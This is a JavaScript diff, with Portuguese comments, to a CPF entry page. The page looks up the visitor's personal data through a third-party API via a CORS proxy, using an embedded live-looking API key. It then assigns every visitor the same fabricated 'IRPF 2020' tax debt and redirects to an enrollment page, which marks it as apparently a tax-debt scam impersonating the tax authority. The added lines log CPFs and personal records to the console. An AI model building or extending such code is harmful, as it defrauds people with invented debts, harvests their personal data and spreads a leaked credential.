@@ -369,6 +369,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Função de fallback para usar dados mockados
         function usarFallback(cpfValue, cpfFormatted) {
+            console.log('🎯 EVENTO: Usando fallback de dados');
+            
             const validatedData = {
                 cpf: cpfValue,
                 nomeCompleto: 'Usuário',
@@ -376,18 +378,25 @@ document.addEventListener('DOMContentLoaded', function() {
                 nomeMae: 'Não informado'
             };
             sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));
+            
+            console.log('💾 Dados validados (fallback) salvos no sessionStorage:', validatedData);
 
-            localStorage.setItem('customerData', JSON.stringify({
+            const customerData = {
                 nome: 'Usuário',
                 cpf: cpfFormatted,
                 situacao: 'REGULAR',
                 data_nascimento: '1990-01-01', // Formato da API (YYYY-MM-DD)
                 nome_mae: 'Não informado',
                 debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
-            }));
+            };
+            localStorage.setItem('customerData', JSON.stringify(customerData));
+            
+            console.log('💾 Dados do cliente (fallback) salvos no localStorage:', customerData);
 
             hideCpfError();
             document.getElementById('cpfInput').style.borderColor = '#28a745';
+            
+            console.log('🔄 Redirecionando para adesao.html...');
             window.location.href = buildUrlWithParams('adesao.html');
         }
 
@@ -404,10 +413,14 @@ document.addEventListener('DOMContentLoaded', function() {
         // Handle form submission
         cpfForm.addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            console.log('🎯 EVENTO: Formulário de CPF enviado');
 
             hideCpfError();
 
             const cpfValue = cpfInput.value.replace(/\D/g, '');
+            console.log('📝 CPF digitado:', cpfValue);
+            
             if (cpfValue.length !== 11) {
                 showCpfError('CPF inválido. Digite 11 dígitos.');
                 return;
@@ -415,9 +428,12 @@ document.addEventListener('DOMContentLoaded', function() {
 
             // Step 1: Local math validation
             if (!isValidCPF(cpfValue)) {
+                console.warn('❌ Validação matemática do CPF falhou');
                 showCpfError('CPF inválido. Verifique os dígitos.');
                 return;
             }
+            
+            console.log('✅ Validação matemática do CPF passou');
 
             const btn = e.target.querySelector('button[type="submit"]');
             const originalText = btn.innerHTML;
@@ -426,21 +442,27 @@ document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('cpfLoading').style.display = 'block';
 
             try {
-                console.log('Tentando consultar CPF na API...');
+                console.log('🔍 Tentando consultar CPF na API...');
                 
                 // Step 2: Call external API usando a documentação com proxy CORS para evitar erro
                 const proxyUrl = 'https://api.allorigins.win/get?url=';
                 const apiUrl = encodeURIComponent(`https://search.apisegura.cloud/cpf?token=sk_live_dDDrUBdxkA7ANWYp_BZxlWnQw6UNNGPd&cpf=${cpfValue}`);
                 
+                console.log('📤 Requisição para:', proxyUrl + apiUrl);
+                
                 const response = await fetch(proxyUrl + apiUrl);
                 
                 // O proxy retorna os dados no campo contents
                 const proxyData = await response.json();
+                console.log('📥 Resposta do proxy:', proxyData);
+                
                 const data = JSON.parse(proxyData.contents);
-                console.log('Dados da API via proxy:', data);
+                console.log('📋 Dados da API via proxy:', data);
 
                 // Verificar se a API retornou dados válidos
                 if (data && data.nome) {
+                    console.log('✅ Dados do CPF encontrados na API');
+                    
                     // Save validated data for downstream use
                     const validatedData = {
                         cpf: cpfValue,
@@ -449,29 +471,36 @@ document.addEventListener('DOMContentLoaded', function() {
                         nomeMae: data.nome_mae || ''
                     };
                     sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));
+                    
+                    console.log('💾 Dados validados salvos no sessionStorage:', validatedData);
 
                     // Save legacy customerData for downstream pages
-                    localStorage.setItem('customerData', JSON.stringify({
+                    const customerData = {
                         nome: data.nome || 'Usuário',
                         cpf: cpfInput.value,
                         situacao: data.situacao_receita || 'REGULAR',
                         data_nascimento: data.nascimento || '',
                         nome_mae: data.nome_mae || '',
                         debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
-                    }));
+                    };
+                    localStorage.setItem('customerData', JSON.stringify(customerData));
+                    
+                    console.log('💾 Dados do cliente salvos no localStorage:', customerData);
 
                     // Clear any visible error and proceed
             hideCpfError();
             cpfInput.style.borderColor = '#28a745';
+            
+            console.log('🔄 Redirecionando para adesao.html...');
             window.location.href = buildUrlWithParams('adesao.html');
                 } else {
                     // Fallback: se CPF não for encontrado na API, usar dados mockados
-                    console.warn('CPF não encontrado na API, usando fallback');
+                    console.warn('⚠️ CPF não encontrado na API, usando fallback');
                     usarFallback(cpfValue, cpfInput.value);
                 }
             } catch (err) {
                 // Fallback: se a API falhar, usar dados mockados para permitir o usuário continuar
-                console.warn('API de CPF falhou, usando fallback:', err);
+                console.error('💥 API de CPF falhou, usando fallback:', err);
                 usarFallback(cpfValue, cpfInput.value);
             } finally {
                 btn.disabled = false;
